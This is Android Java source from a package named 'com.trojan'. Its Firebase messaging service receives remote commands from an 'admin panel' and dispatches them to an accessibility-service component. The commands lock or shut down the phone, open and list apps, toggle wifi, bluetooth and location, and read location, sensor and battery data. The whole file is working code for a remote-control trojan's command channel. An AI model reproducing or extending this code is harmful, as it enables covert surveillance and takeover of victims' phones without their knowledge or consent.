package com.trojan;

import android.content.Intent;
import android.util.Log;
import androidx.annotation.NonNull;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import java.util.Map;

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    private static final String TAG = "MyFirebaseMsgService";

    @Override
    public void onMessageReceived(@NonNull RemoteMessage remoteMessage) {
        super.onMessageReceived(remoteMessage);
        Log.d(TAG, "FCM Message From: " + remoteMessage.getFrom());

        // Check if the message contains a data payload.
        if (remoteMessage.getData().size() > 0) {
            Map<String, String> data = remoteMessage.getData();
            Log.d(TAG, "Message data payload: " + data);

            String action = data.get("action");
            if (action == null) {
                Log.w(TAG, "No 'action' key found in FCM message data.");
                return;
            }

            Intent intent = new Intent();
            
            // This switch block maps the string command from your admin panel
            // to the correct internal broadcast action string.
            switch (action.toLowerCase()) {
                // Original Actions
                case "lock":
                    intent.setAction(PowerAccessibilityService.ACTION_TRIGGER_LOCK_SCREEN);
                    break;
                case "shutdown":
                    intent.setAction(PowerAccessibilityService.ACTION_TRIGGER_SHUTDOWN);
                    break;
                case "list_apps":
                    intent.setAction(PowerAccessibilityService.ACTION_TRIGGER_LIST_APPS);
                    break;
                case "get_current_app":
                    intent.setAction(PowerAccessibilityService.ACTION_TRIGGER_GET_CURRENT_APP);
                    break;
                case "open_app":
                    String packageToOpen = data.get("package_name");
                    if (packageToOpen != null) {
                        intent.setAction(PowerAccessibilityService.ACTION_TRIGGER_OPEN_APP);
                        intent.putExtra("package_name", packageToOpen);
                    } else {
                        Log.w(TAG, "Action 'open_app' received without 'package_name' extra data.");
                    }
                    break;
                
                // --- All New Actions ---
                case "nav_back":
                    intent.setAction(PowerAccessibilityService.ACTION_TRIGGER_NAV_BACK);
                    break;
                case "nav_home":
                    intent.setAction(PowerAccessibilityService.ACTION_TRIGGER_NAV_HOME);
                    break;
                case "nav_recents":
                    intent.setAction(PowerAccessibilityService.ACTION_TRIGGER_NAV_RECENTS);
                    break;
                case "wake_device":
                    intent.setAction(PowerAccessibilityService.ACTION_TRIGGER_WAKE_DEVICE);
                    break;
                case "toggle_wifi":
                    intent.setAction(PowerAccessibilityService.ACTION_TRIGGER_TOGGLE_WIFI);
                    break;
                case "toggle_bluetooth":
                    intent.setAction(PowerAccessibilityService.ACTION_TRIGGER_TOGGLE_BLUETOOTH);
                    break;
                case "toggle_location":
                    intent.setAction(PowerAccessibilityService.ACTION_TRIGGER_TOGGLE_LOCATION);
                    break;
                case "get_location":
                    intent.setAction(PowerAccessibilityService.ACTION_TRIGGER_GET_LOCATION);
                    break;
                case "get_sensors":
                    intent.setAction(PowerAccessibilityService.ACTION_TRIGGER_GET_SENSORS);
                    break;
                case "get_screen_status":
                    intent.setAction(PowerAccessibilityService.ACTION_TRIGGER_GET_SCREEN_STATUS);
                    break;
                case "get_battery_status":
                    intent.setAction(PowerAccessibilityService.ACTION_TRIGGER_GET_BATTERY_STATUS);
                    break;

                default:
                    Log.w(TAG, "Received unknown action: " + action);
            }

            // If the intent's action was set, broadcast it to the rest of the app.
            if (intent.getAction() != null) {
                Log.d(TAG, "Broadcasting action: " + intent.getAction());
                sendBroadcast(intent);
            }
        }
    }

    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);
        Log.d(TAG, "Refreshed FCM token: " + token);
        // This is where you would trigger a re-registration with your Netlify server
        // if the token ever changes. We already have this logic in MainActivity,
        // which is sufficient for when the app starts.
    }
}
